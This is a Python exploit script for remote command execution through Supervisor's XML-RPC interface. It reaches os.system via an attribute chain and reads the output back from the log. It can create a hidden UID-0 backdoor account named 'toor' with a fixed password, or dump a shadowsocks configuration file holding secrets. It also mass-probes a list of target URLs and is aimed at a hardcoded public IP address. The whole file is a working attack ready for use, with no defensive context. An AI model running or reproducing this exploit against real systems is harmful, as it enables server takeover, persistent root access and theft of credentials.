#!/usr/bin/env python3
import xmlrpc.client
import json
import requests

def supervisorRPCAttack(url, add_user=False):
    target = url

    if add_user:
        command = "useradd -p `openssl passwd -1 -salt 'salt' Toor123` -u 0 -o -g root -G root toor"
    else:
        # command = "ssserver -p 4444 -k IneedShadowsocksThankYou -m aes-256-cfb --user nobody -d start"
        command = "cat /home/xmxjq/shadowsocks/shadowsocks.json"

    with xmlrpc.client.ServerProxy(target) as proxy:
        old = getattr(proxy, 'supervisor.readLog')(0,0)

        logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
        getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
        result = getattr(proxy, 'supervisor.readLog')(0,0)

        print(result[len(old):])

def process_all():
    payload = '<?xml version="1.0"?>\
    <methodCall>\
    <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>\
    <params>\
    <param>\
    <string>touch /tmp/success</string>\
    </param>\
    </params>\
    </methodCall>'

    target_file = open('supervisor.json')
    urls = json.loads(target_file.read())
    for url in urls:
        try:
            response = requests.post(url=url, data=payload, timeout=10)
            print(url, response.status_code)
            supervisorRPCAttack(url)
        except Exception as e:
            print('error:',url,e)

def process_one():
    supervisorRPCAttack('http://61.195.109.95:32786/RPC2', False)

if __name__ == '__main__':
    process_one()
